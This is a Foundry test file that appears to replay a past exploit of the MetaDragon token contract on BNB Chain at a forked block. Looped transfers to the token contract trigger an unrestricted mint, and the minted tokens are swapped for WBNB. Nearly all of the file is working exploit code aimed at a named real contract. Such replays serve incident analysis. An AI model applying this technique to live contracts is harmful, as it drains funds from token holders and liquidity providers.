// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// Profit : ~180K USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x3ad998a01ad1f1bbe6dba6a08e658c1749dabfa4a07da20ded3c73bcd6970d20
// GUY : https://x.com/Phalcon_xyz/status/1795746828064854497
// Vuln Contract: https://bscscan.com/address/0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f

// Root Cause: ```if (to == address(this) || to == erc721) {transform(value);}``` allows for unrestricted minting

address constant meta_token = 0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f;
address constant router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant wbnb = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;


contract MetaDragonTest is Test {
    uint256 endTokenId = 40;

    function setUp() external {
        vm.createSelectFork("bsc", 39_141_426);
    }

    function testExploit() public balance_log{
        for (uint i = 0; i < endTokenId; i++) {
            bytes memory calldatas = abi.encodeWithSignature("transfer(address,uint256)", meta_token, i);
            // don't check return value
            meta_token.call(calldatas);
        }
        emit log_named_uint("attacker MetaToken balance", IERC20(meta_token).balanceOf(address(this)));

        IERC20(meta_token).approve(router,type(uint256).max);
        address[] memory paths = new address[](2);
        paths[0] = meta_token;
        paths[1] = wbnb;

        IUniswapV2Router(payable(router)).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(meta_token).balanceOf(address(this)),
            0,
            paths,
            address(this),
            block.timestamp
        );
    }

    modifier balance_log() {
        emit log_named_uint("attacker weth balance before", IERC20(wbnb).balanceOf(address(this)));
        _;
        emit log_named_uint("attacker weth balance after", IERC20(wbnb).balanceOf(address(this)));
    }


}
